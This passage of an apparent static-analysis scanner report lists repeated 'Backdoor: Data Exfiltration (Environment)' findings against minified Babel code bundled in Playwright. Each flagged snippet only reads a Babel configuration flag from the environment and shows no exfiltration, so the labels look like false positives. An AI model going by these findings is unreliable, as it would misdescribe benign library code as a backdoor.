                      "text": "n\",\"PatternLike\")},shorthand:{validate:(0,h.chain)((0,h.assertValueType)(\"boolean\"),Object.assign(function(e,t,r){if(process.env.BABEL_TYPES_8_BREAKING&&r&&e.computed)throw new TypeError(\"Property shorthand of ObjectProperty cannot be true if computed is true\")},{type:\"boolean\"}),function(e,t,r){if(process.env.BABEL_TYPES_8_BREAKING&&r&&!(0,ur.default)(\"Identifier\",e.key))throw new TypeError(\"Property shorthand of ObjectProperty cannot be true if key is not an Identifier\")}),default:!1},decorators:{validate:(0,h.chain)((0,h.assertValueType)(\"array\"),(0,h.assertEach)((0,h.assertNodeType)(\"Decorator\"))),op",
                      "markdown": "`n\",\"PatternLike\")},shorthand:{validate:(0,h.chain)((0,h.assertValueType)(\"boolean\"),Object.assign(function(e,t,r){if(process.env.BABEL_TYPES_8_BREAKING&&r&&e.computed)throw new TypeError(\"Property shorthand of ObjectProperty cannot be true if computed is true\")},{type:\"boolean\"}),function(e,t,r){if(process.env.BABEL_TYPES_8_BREAKING&&r&&!(0,ur.default)(\"Identifier\",e.key))throw new TypeError(\"Property shorthand of ObjectProperty cannot be true if key is not an Identifier\")}),default:!1},decorators:{validate:(0,h.chain)((0,h.assertValueType)(\"array\"),(0,h.assertEach)((0,h.assertNodeType)(\"Decorator\"))),op`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 16328,
                  "endLine": 7,
                  "endColumn": 16339,
                  "snippet": {
                    "text": "s,i)},{oneOfNodeTypes:[\"Expression\",\"Identifier\",\"StringLiteral\",\"NumericLiteral\",\"BigIntLiteral\",\"DecimalLiteral\",\"PrivateName\"]})}()},value:{validate:(0,h.assertNodeType)(\"Expression\",\"PatternLike\")},shorthand:{validate:(0,h.chain)((0,h.assertValueType)(\"boolean\"),Object.assign(function(e,t,r){if(process.env.BABEL_TYPES_8_BREAKING&&r&&e.computed)throw new TypeError(\"Property shorthand of ObjectProperty cannot be true if computed is true\")},{type:\"boolean\"}),function(e,t,r){if(process.env.BABEL_TYPES_8_BREAKING&&r&&!(0,ur.default)(\"Identifier\",e.key))throw new TypeError(\"Property shorthand of ObjectProp",
                    "rendered": {
                      "text": "s,i)},{oneOfNodeTypes:[\"Expression\",\"Identifier\",\"StringLiteral\",\"NumericLiteral\",\"BigIntLiteral\",\"DecimalLiteral\",\"PrivateName\"]})}()},value:{validate:(0,h.assertNodeType)(\"Expression\",\"PatternLike\")},shorthand:{validate:(0,h.chain)((0,h.assertValueType)(\"boolean\"),Object.assign(function(e,t,r){if(process.env.BABEL_TYPES_8_BREAKING&&r&&e.computed)throw new TypeError(\"Property shorthand of ObjectProperty cannot be true if computed is true\")},{type:\"boolean\"}),function(e,t,r){if(process.env.BABEL_TYPES_8_BREAKING&&r&&!(0,ur.default)(\"Identifier\",e.key))throw new TypeError(\"Property shorthand of ObjectProp",
                      "markdown": "`s,i)},{oneOfNodeTypes:[\"Expression\",\"Identifier\",\"StringLiteral\",\"NumericLiteral\",\"BigIntLiteral\",\"DecimalLiteral\",\"PrivateName\"]})}()},value:{validate:(0,h.assertNodeType)(\"Expression\",\"PatternLike\")},shorthand:{validate:(0,h.chain)((0,h.assertValueType)(\"boolean\"),Object.assign(function(e,t,r){if(process.env.BABEL_TYPES_8_BREAKING&&r&&e.computed)throw new TypeError(\"Property shorthand of ObjectProperty cannot be true if computed is true\")},{type:\"boolean\"}),function(e,t,r){if(process.env.BABEL_TYPES_8_BREAKING&&r&&!(0,ur.default)(\"Identifier\",e.key))throw new TypeError(\"Property shorthand of ObjectProp`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 15705,
                  "endLine": 7,
                  "endColumn": 15716,
                  "snippet": {
                    "text": "date:(0,h.assertNodeType)(\"BlockStatement\")}}),visitor:[\"key\",\"params\",\"body\",\"decorators\",\"returnType\",\"typeParameters\"],aliases:[\"UserWhitespacable\",\"Function\",\"Scopable\",\"BlockParent\",\"FunctionParent\",\"Method\",\"ObjectMember\"]});Q(\"ObjectProperty\",{builder:[\"key\",\"value\",\"computed\",\"shorthand\",...process.env.BABEL_TYPES_8_BREAKING?[]:[\"decorators\"]],fields:{computed:{default:!1},key:{validate:function(){let e=(0,h.assertNodeType)(\"Identifier\",\"StringLiteral\",\"NumericLiteral\",\"BigIntLiteral\",\"DecimalLiteral\",\"PrivateName\"),t=(0,h.assertNodeType)(\"Expression\");return Object.assign(function(n,s,i){(n.comp",
                    "rendered": {
                      "text": "date:(0,h.assertNodeType)(\"BlockStatement\")}}),visitor:[\"key\",\"params\",\"body\",\"decorators\",\"returnType\",\"typeParameters\"],aliases:[\"UserWhitespacable\",\"Function\",\"Scopable\",\"BlockParent\",\"FunctionParent\",\"Method\",\"ObjectMember\"]});Q(\"ObjectProperty\",{builder:[\"key\",\"value\",\"computed\",\"shorthand\",...process.env.BABEL_TYPES_8_BREAKING?[]:[\"decorators\"]],fields:{computed:{default:!1},key:{validate:function(){let e=(0,h.assertNodeType)(\"Identifier\",\"StringLiteral\",\"NumericLiteral\",\"BigIntLiteral\",\"DecimalLiteral\",\"PrivateName\"),t=(0,h.assertNodeType)(\"Expression\");return Object.assign(function(n,s,i){(n.comp",
                      "markdown": "`date:(0,h.assertNodeType)(\"BlockStatement\")}}),visitor:[\"key\",\"params\",\"body\",\"decorators\",\"returnType\",\"typeParameters\"],aliases:[\"UserWhitespacable\",\"Function\",\"Scopable\",\"BlockParent\",\"FunctionParent\",\"Method\",\"ObjectMember\"]});Q(\"ObjectProperty\",{builder:[\"key\",\"value\",\"computed\",\"shorthand\",...process.env.BABEL_TYPES_8_BREAKING?[]:[\"decorators\"]],fields:{computed:{default:!1},key:{validate:function(){let e=(0,h.assertNodeType)(\"Identifier\",\"StringLiteral\",\"NumericLiteral\",\"BigIntLiteral\",\"DecimalLiteral\",\"PrivateName\"),t=(0,h.assertNodeType)(\"Expression\");return Object.assign(function(n,s,i){(n.comp`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 14883,
                  "endLine": 7,
                  "endColumn": 14894,
                  "snippet": {
                    "text": "ype)(\"array\"),(0,h.assertEach)((0,h.assertNodeType)(\"ObjectMethod\",\"ObjectProperty\",\"SpreadElement\")))}}});Q(\"ObjectMethod\",{builder:[\"kind\",\"key\",\"params\",\"body\",\"computed\",\"generator\",\"async\"],fields:Object.assign({},Ni(),Ws(),{kind:Object.assign({validate:(0,h.assertOneOf)(\"method\",\"get\",\"set\")},process.env.BABEL_TYPES_8_BREAKING?{}:{default:\"method\"}),computed:{default:!1},key:{validate:function(){let e=(0,h.assertNodeType)(\"Identifier\",\"StringLiteral\",\"NumericLiteral\",\"BigIntLiteral\"),t=(0,h.assertNodeType)(\"Expression\"),r=function(n,s,i){(n.computed?t:e)(n,s,i)};return r.oneOfNodeTypes=[\"Expression",
                    "rendered": {
                      "text": "ype)(\"array\"),(0,h.assertEach)((0,h.assertNodeType)(\"ObjectMethod\",\"ObjectProperty\",\"SpreadElement\")))}}});Q(\"ObjectMethod\",{builder:[\"kind\",\"key\",\"params\",\"body\",\"computed\",\"generator\",\"async\"],fields:Object.assign({},Ni(),Ws(),{kind:Object.assign({validate:(0,h.assertOneOf)(\"method\",\"get\",\"set\")},process.env.BABEL_TYPES_8_BREAKING?{}:{default:\"method\"}),computed:{default:!1},key:{validate:function(){let e=(0,h.assertNodeType)(\"Identifier\",\"StringLiteral\",\"NumericLiteral\",\"BigIntLiteral\"),t=(0,h.assertNodeType)(\"Expression\"),r=function(n,s,i){(n.computed?t:e)(n,s,i)};return r.oneOfNodeTypes=[\"Expression",
                      "markdown": "`ype)(\"array\"),(0,h.assertEach)((0,h.assertNodeType)(\"ObjectMethod\",\"ObjectProperty\",\"SpreadElement\")))}}});Q(\"ObjectMethod\",{builder:[\"kind\",\"key\",\"params\",\"body\",\"computed\",\"generator\",\"async\"],fields:Object.assign({},Ni(),Ws(),{kind:Object.assign({validate:(0,h.assertOneOf)(\"method\",\"get\",\"set\")},process.env.BABEL_TYPES_8_BREAKING?{}:{default:\"method\"}),computed:{default:!1},key:{validate:function(){let e=(0,h.assertNodeType)(\"Identifier\",\"StringLiteral\",\"NumericLiteral\",\"BigIntLiteral\"),t=(0,h.assertNodeType)(\"Expression\"),r=function(n,s,i){(n.computed?t:e)(n,s,i)};return r.oneOfNodeTypes=[\"Expression`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 13746,
                  "endLine": 7,
                  "endColumn": 13757,
                  "snippet": {
                    "text": ".assertNodeType)(\"Expression\",\"Super\")},property:{validate:function(){let e=(0,h.assertNodeType)(\"Identifier\",\"PrivateName\"),t=(0,h.assertNodeType)(\"Expression\"),r=function(n,s,i){(n.computed?t:e)(n,s,i)};return r.oneOfNodeTypes=[\"Expression\",\"Identifier\",\"PrivateName\"],r}()},computed:{default:!1}},process.env.BABEL_TYPES_8_BREAKING?{}:{optional:{validate:(0,h.assertOneOf)(!0,!1),optional:!0}})});Q(\"NewExpression\",{inherits:\"CallExpression\"});Q(\"Program\",{visitor:[\"directives\",\"body\"],builder:[\"body\",\"directives\",\"sourceType\",\"interpreter\"],fields:{sourceType:{validate:(0,h.assertOneOf)(\"script\",\"module\"",
                    "rendered": {
                      "text": ".assertNodeType)(\"Expression\",\"Super\")},property:{validate:function(){let e=(0,h.assertNodeType)(\"Identifier\",\"PrivateName\"),t=(0,h.assertNodeType)(\"Expression\"),r=function(n,s,i){(n.computed?t:e)(n,s,i)};return r.oneOfNodeTypes=[\"Expression\",\"Identifier\",\"PrivateName\"],r}()},computed:{default:!1}},process.env.BABEL_TYPES_8_BREAKING?{}:{optional:{validate:(0,h.assertOneOf)(!0,!1),optional:!0}})});Q(\"NewExpression\",{inherits:\"CallExpression\"});Q(\"Program\",{visitor:[\"directives\",\"body\"],builder:[\"body\",\"directives\",\"sourceType\",\"interpreter\"],fields:{sourceType:{validate:(0,h.assertOneOf)(\"script\",\"module\"",
                      "markdown": "`.assertNodeType)(\"Expression\",\"Super\")},property:{validate:function(){let e=(0,h.assertNodeType)(\"Identifier\",\"PrivateName\"),t=(0,h.assertNodeType)(\"Expression\"),r=function(n,s,i){(n.computed?t:e)(n,s,i)};return r.oneOfNodeTypes=[\"Expression\",\"Identifier\",\"PrivateName\"],r}()},computed:{default:!1}},process.env.BABEL_TYPES_8_BREAKING?{}:{optional:{validate:(0,h.assertOneOf)(!0,!1),optional:!0}})});Q(\"NewExpression\",{inherits:\"CallExpression\"});Q(\"Program\",{visitor:[\"directives\",\"body\"],builder:[\"body\",\"directives\",\"sourceType\",\"interpreter\"],fields:{sourceType:{validate:(0,h.assertOneOf)(\"script\",\"module\"`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 13291,
                  "endLine": 7,
                  "endColumn": 13302,
                  "snippet": {
                    "text": ",visitor:[\"left\",\"right\"],aliases:[\"Binary\",\"Expression\"],fields:{operator:{validate:(0,h.assertOneOf)(...Ha.LOGICAL_OPERATORS)},left:{validate:(0,h.assertNodeType)(\"Expression\")},right:{validate:(0,h.assertNodeType)(\"Expression\")}}});Q(\"MemberExpression\",{builder:[\"object\",\"property\",\"computed\",...process.env.BABEL_TYPES_8_BREAKING?[]:[\"optional\"]],visitor:[\"object\",\"property\"],aliases:[\"Expression\",\"LVal\"],fields:Object.assign({object:{validate:(0,h.assertNodeType)(\"Expression\",\"Super\")},property:{validate:function(){let e=(0,h.assertNodeType)(\"Identifier\",\"PrivateName\"),t=(0,h.assertNodeType)(\"Express",
                    "rendered": {
                      "text": ",visitor:[\"left\",\"right\"],aliases:[\"Binary\",\"Expression\"],fields:{operator:{validate:(0,h.assertOneOf)(...Ha.LOGICAL_OPERATORS)},left:{validate:(0,h.assertNodeType)(\"Expression\")},right:{validate:(0,h.assertNodeType)(\"Expression\")}}});Q(\"MemberExpression\",{builder:[\"object\",\"property\",\"computed\",...process.env.BABEL_TYPES_8_BREAKING?[]:[\"optional\"]],visitor:[\"object\",\"property\"],aliases:[\"Expression\",\"LVal\"],fields:Object.assign({object:{validate:(0,h.assertNodeType)(\"Expression\",\"Super\")},property:{validate:function(){let e=(0,h.assertNodeType)(\"Identifier\",\"PrivateName\"),t=(0,h.assertNodeType)(\"Express",
                      "markdown": "`,visitor:[\"left\",\"right\"],aliases:[\"Binary\",\"Expression\"],fields:{operator:{validate:(0,h.assertOneOf)(...Ha.LOGICAL_OPERATORS)},left:{validate:(0,h.assertNodeType)(\"Expression\")},right:{validate:(0,h.assertNodeType)(\"Expression\")}}});Q(\"MemberExpression\",{builder:[\"object\",\"property\",\"computed\",...process.env.BABEL_TYPES_8_BREAKING?[]:[\"optional\"]],visitor:[\"object\",\"property\"],aliases:[\"Expression\",\"LVal\"],fields:Object.assign({object:{validate:(0,h.assertNodeType)(\"Expression\",\"Super\")},property:{validate:function(){let e=(0,h.assertNodeType)(\"Identifier\",\"PrivateName\"),t=(0,h.assertNodeType)(\"Express`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 12766,
                  "endLine": 7,
                  "endColumn": 12777,
                  "snippet": {
                    "text": ",\"Literal\",\"Immutable\"]});Q(\"RegExpLiteral\",{builder:[\"pattern\",\"flags\"],deprecatedAlias:\"RegexLiteral\",aliases:[\"Expression\",\"Pureish\",\"Literal\"],fields:{pattern:{validate:(0,h.assertValueType)(\"string\")},flags:{validate:(0,h.chain)((0,h.assertValueType)(\"string\"),Object.assign(function(e,t,r){if(!process.env.BABEL_TYPES_8_BREAKING)return;let n=/[^gimsuy]/.exec(r);if(n)throw new TypeError(`\"${n[0]}\" is not a valid RegExp flag`)},{type:\"string\"})),default:\"\"}}});Q(\"LogicalExpression\",{builder:[\"operator\",\"left\",\"right\"],visitor:[\"left\",\"right\"],aliases:[\"Binary\",\"Expression\"],fields:{operator:{validate:(",
                    "rendered": {
                      "text": ",\"Literal\",\"Immutable\"]});Q(\"RegExpLiteral\",{builder:[\"pattern\",\"flags\"],deprecatedAlias:\"RegexLiteral\",aliases:[\"Expression\",\"Pureish\",\"Literal\"],fields:{pattern:{validate:(0,h.assertValueType)(\"string\")},flags:{validate:(0,h.chain)((0,h.assertValueType)(\"string\"),Object.assign(function(e,t,r){if(!process.env.BABEL_TYPES_8_BREAKING)return;let n=/[^gimsuy]/.exec(r);if(n)throw new TypeError(`\"${n[0]}\" is not a valid RegExp flag`)},{type:\"string\"})),default:\"\"}}});Q(\"LogicalExpression\",{builder:[\"operator\",\"left\",\"right\"],visitor:[\"left\",\"right\"],aliases:[\"Binary\",\"Expression\"],fields:{operator:{validate:(",
                      "markdown": "`,\"Literal\",\"Immutable\"]});Q(\"RegExpLiteral\",{builder:[\"pattern\",\"flags\"],deprecatedAlias:\"RegexLiteral\",aliases:[\"Expression\",\"Pureish\",\"Literal\"],fields:{pattern:{validate:(0,h.assertValueType)(\"string\")},flags:{validate:(0,h.chain)((0,h.assertValueType)(\"string\"),Object.assign(function(e,t,r){if(!process.env.BABEL_TYPES_8_BREAKING)return;let n=/[^gimsuy]/.exec(r);if(n)throw new TypeError(`\"${n[0]}\" is not a valid RegExp flag`)},{type:\"string\"})),default:\"\"}}});Q(\"LogicalExpression\",{builder:[\"operator\",\"left\",\"right\"],visitor:[\"left\",\"right\"],aliases:[\"Binary\",\"Expression\"],fields:{operator:{validate:(`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 10580,
                  "endLine": 7,
                  "endColumn": 10591,
                  "snippet": {
                    "text": ",\"TSEntityName\"],fields:Object.assign({},ki(),{name:{validate:(0,h.chain)((0,h.assertValueType)(\"string\"),Object.assign(function(e,t,r){if(process.env.BABEL_TYPES_8_BREAKING&&!(0,m4.default)(r,!1))throw new TypeError(`\"${r}\" is not a valid identifier name`)},{type:\"string\"}))}}),validate(e,t,r){if(!process.env.BABEL_TYPES_8_BREAKING)return;let n=/\\.(\\w+)$/.exec(t);if(!n)return;let[,s]=n,i={computed:!1};if(s===\"property\"){if((0,ur.default)(\"MemberExpression\",e,i)||(0,ur.default)(\"OptionalMemberExpression\",e,i))return}else if(s===\"key\"){if((0,ur.default)(\"Property\",e,i)||(0,ur.default)(\"Method\",e,i))return",
                    "rendered": {
                      "text": ",\"TSEntityName\"],fields:Object.assign({},ki(),{name:{validate:(0,h.chain)((0,h.assertValueType)(\"string\"),Object.assign(function(e,t,r){if(process.env.BABEL_TYPES_8_BREAKING&&!(0,m4.default)(r,!1))throw new TypeError(`\"${r}\" is not a valid identifier name`)},{type:\"string\"}))}}),validate(e,t,r){if(!process.env.BABEL_TYPES_8_BREAKING)return;let n=/\\.(\\w+)$/.exec(t);if(!n)return;let[,s]=n,i={computed:!1};if(s===\"property\"){if((0,ur.default)(\"MemberExpression\",e,i)||(0,ur.default)(\"OptionalMemberExpression\",e,i))return}else if(s===\"key\"){if((0,ur.default)(\"Property\",e,i)||(0,ur.default)(\"Method\",e,i))return",
                      "markdown": "`,\"TSEntityName\"],fields:Object.assign({},ki(),{name:{validate:(0,h.chain)((0,h.assertValueType)(\"string\"),Object.assign(function(e,t,r){if(process.env.BABEL_TYPES_8_BREAKING&&!(0,m4.default)(r,!1))throw new TypeError(`\"${r}\" is not a valid identifier name`)},{type:\"string\"}))}}),validate(e,t,r){if(!process.env.BABEL_TYPES_8_BREAKING)return;let n=/\\.(\\w+)$/.exec(t);if(!n)return;let[,s]=n,i={computed:!1};if(s===\"property\"){if((0,ur.default)(\"MemberExpression\",e,i)||(0,ur.default)(\"OptionalMemberExpression\",e,i))return}else if(s===\"key\"){if((0,ur.default)(\"Property\",e,i)||(0,ur.default)(\"Method\",e,i))return`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 10419,
                  "endLine": 7,
                  "endColumn": 10430,
                  "snippet": {
                    "text": "or\"))),optional:!0}});vr.patternLikeCommon=ki;Q(\"Identifier\",{builder:[\"name\"],visitor:[\"typeAnnotation\",\"decorators\"],aliases:[\"Expression\",\"PatternLike\",\"LVal\",\"TSEntityName\"],fields:Object.assign({},ki(),{name:{validate:(0,h.chain)((0,h.assertValueType)(\"string\"),Object.assign(function(e,t,r){if(process.env.BABEL_TYPES_8_BREAKING&&!(0,m4.default)(r,!1))throw new TypeError(`\"${r}\" is not a valid identifier name`)},{type:\"string\"}))}}),validate(e,t,r){if(!process.env.BABEL_TYPES_8_BREAKING)return;let n=/\\.(\\w+)$/.exec(t);if(!n)return;let[,s]=n,i={computed:!1};if(s===\"property\"){if((0,ur.default)(\"Member",
                    "rendered": {
                      "text": "or\"))),optional:!0}});vr.patternLikeCommon=ki;Q(\"Identifier\",{builder:[\"name\"],visitor:[\"typeAnnotation\",\"decorators\"],aliases:[\"Expression\",\"PatternLike\",\"LVal\",\"TSEntityName\"],fields:Object.assign({},ki(),{name:{validate:(0,h.chain)((0,h.assertValueType)(\"string\"),Object.assign(function(e,t,r){if(process.env.BABEL_TYPES_8_BREAKING&&!(0,m4.default)(r,!1))throw new TypeError(`\"${r}\" is not a valid identifier name`)},{type:\"string\"}))}}),validate(e,t,r){if(!process.env.BABEL_TYPES_8_BREAKING)return;let n=/\\.(\\w+)$/.exec(t);if(!n)return;let[,s]=n,i={computed:!1};if(s===\"property\"){if((0,ur.default)(\"Member",
                      "markdown": "`or\"))),optional:!0}});vr.patternLikeCommon=ki;Q(\"Identifier\",{builder:[\"name\"],visitor:[\"typeAnnotation\",\"decorators\"],aliases:[\"Expression\",\"PatternLike\",\"LVal\",\"TSEntityName\"],fields:Object.assign({},ki(),{name:{validate:(0,h.chain)((0,h.assertValueType)(\"string\"),Object.assign(function(e,t,r){if(process.env.BABEL_TYPES_8_BREAKING&&!(0,m4.default)(r,!1))throw new TypeError(`\"${r}\" is not a valid identifier name`)},{type:\"string\"}))}}),validate(e,t,r){if(!process.env.BABEL_TYPES_8_BREAKING)return;let n=/\\.(\\w+)$/.exec(t);if(!n)return;let[,s]=n,i={computed:!1};if(s===\"property\"){if((0,ur.default)(\"Member`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 9258,
                  "endLine": 7,
                  "endColumn": 9269,
                  "snippet": {
                    "text": "ect.assign({},mv(),Ws(),{body:{validate:(0,h.assertNodeType)(\"BlockStatement\")},predicate:{validate:(0,h.assertNodeType)(\"DeclaredPredicate\",\"InferredPredicate\"),optional:!0}}),aliases:[\"Scopable\",\"Function\",\"BlockParent\",\"FunctionParent\",\"Statement\",\"Pureish\",\"Declaration\"],validate:function(){if(!process.env.BABEL_TYPES_8_BREAKING)return()=>{};let e=(0,h.assertNodeType)(\"Identifier\");return function(t,r,n){(0,ur.default)(\"ExportDefaultDeclaration\",t)||e(n,\"id\",n.id)}}()});Q(\"FunctionExpression\",{inherits:\"FunctionDeclaration\",aliases:[\"Scopable\",\"Function\",\"BlockParent\",\"FunctionParent\",\"Expression\",\"P",
                    "rendered": {
                      "text": "ect.assign({},mv(),Ws(),{body:{validate:(0,h.assertNodeType)(\"BlockStatement\")},predicate:{validate:(0,h.assertNodeType)(\"DeclaredPredicate\",\"InferredPredicate\"),optional:!0}}),aliases:[\"Scopable\",\"Function\",\"BlockParent\",\"FunctionParent\",\"Statement\",\"Pureish\",\"Declaration\"],validate:function(){if(!process.env.BABEL_TYPES_8_BREAKING)return()=>{};let e=(0,h.assertNodeType)(\"Identifier\");return function(t,r,n){(0,ur.default)(\"ExportDefaultDeclaration\",t)||e(n,\"id\",n.id)}}()});Q(\"FunctionExpression\",{inherits:\"FunctionDeclaration\",aliases:[\"Scopable\",\"Function\",\"BlockParent\",\"FunctionParent\",\"Expression\",\"P",
                      "markdown": "`ect.assign({},mv(),Ws(),{body:{validate:(0,h.assertNodeType)(\"BlockStatement\")},predicate:{validate:(0,h.assertNodeType)(\"DeclaredPredicate\",\"InferredPredicate\"),optional:!0}}),aliases:[\"Scopable\",\"Function\",\"BlockParent\",\"FunctionParent\",\"Statement\",\"Pureish\",\"Declaration\"],validate:function(){if(!process.env.BABEL_TYPES_8_BREAKING)return()=>{};let e=(0,h.assertNodeType)(\"Identifier\");return function(t,r,n){(0,ur.default)(\"ExportDefaultDeclaration\",t)||e(n,\"id\",n.id)}}()});Q(\"FunctionExpression\",{inherits:\"FunctionDeclaration\",aliases:[\"Scopable\",\"Function\",\"BlockParent\",\"FunctionParent\",\"Expression\",\"P`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 7357,
                  "endLine": 7,
                  "endColumn": 7368,
                  "snippet": {
                    "text": "{oneOfNodeTypes:[\"CommentBlock\",\"CommentLine\"]}}),optional:!0},tokens:{validate:(0,h.assertEach)(Object.assign(()=>{},{type:\"any\"})),optional:!0}}});Q(\"ForInStatement\",{visitor:[\"left\",\"right\",\"body\"],aliases:[\"Scopable\",\"Statement\",\"For\",\"BlockParent\",\"Loop\",\"ForXStatement\"],fields:{left:{validate:process.env.BABEL_TYPES_8_BREAKING?(0,h.assertNodeType)(\"VariableDeclaration\",\"Identifier\",\"MemberExpression\",\"ArrayPattern\",\"ObjectPattern\",\"TSAsExpression\",\"TSSatisfiesExpression\",\"TSTypeAssertion\",\"TSNonNullExpression\"):(0,h.assertNodeType)(\"VariableDeclaration\",\"LVal\")},right:{validate:(0,h.assertNodeType)",
                    "rendered": {
                      "text": "{oneOfNodeTypes:[\"CommentBlock\",\"CommentLine\"]}}),optional:!0},tokens:{validate:(0,h.assertEach)(Object.assign(()=>{},{type:\"any\"})),optional:!0}}});Q(\"ForInStatement\",{visitor:[\"left\",\"right\",\"body\"],aliases:[\"Scopable\",\"Statement\",\"For\",\"BlockParent\",\"Loop\",\"ForXStatement\"],fields:{left:{validate:process.env.BABEL_TYPES_8_BREAKING?(0,h.assertNodeType)(\"VariableDeclaration\",\"Identifier\",\"MemberExpression\",\"ArrayPattern\",\"ObjectPattern\",\"TSAsExpression\",\"TSSatisfiesExpression\",\"TSTypeAssertion\",\"TSNonNullExpression\"):(0,h.assertNodeType)(\"VariableDeclaration\",\"LVal\")},right:{validate:(0,h.assertNodeType)",
                      "markdown": "`{oneOfNodeTypes:[\"CommentBlock\",\"CommentLine\"]}}),optional:!0},tokens:{validate:(0,h.assertEach)(Object.assign(()=>{},{type:\"any\"})),optional:!0}}});Q(\"ForInStatement\",{visitor:[\"left\",\"right\",\"body\"],aliases:[\"Scopable\",\"Statement\",\"For\",\"BlockParent\",\"Loop\",\"ForXStatement\"],fields:{left:{validate:process.env.BABEL_TYPES_8_BREAKING?(0,h.assertNodeType)(\"VariableDeclaration\",\"Identifier\",\"MemberExpression\",\"ArrayPattern\",\"ObjectPattern\",\"TSAsExpression\",\"TSSatisfiesExpression\",\"TSTypeAssertion\",\"TSNonNullExpression\"):(0,h.assertNodeType)(\"VariableDeclaration\",\"LVal\")},right:{validate:(0,h.assertNodeType)`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
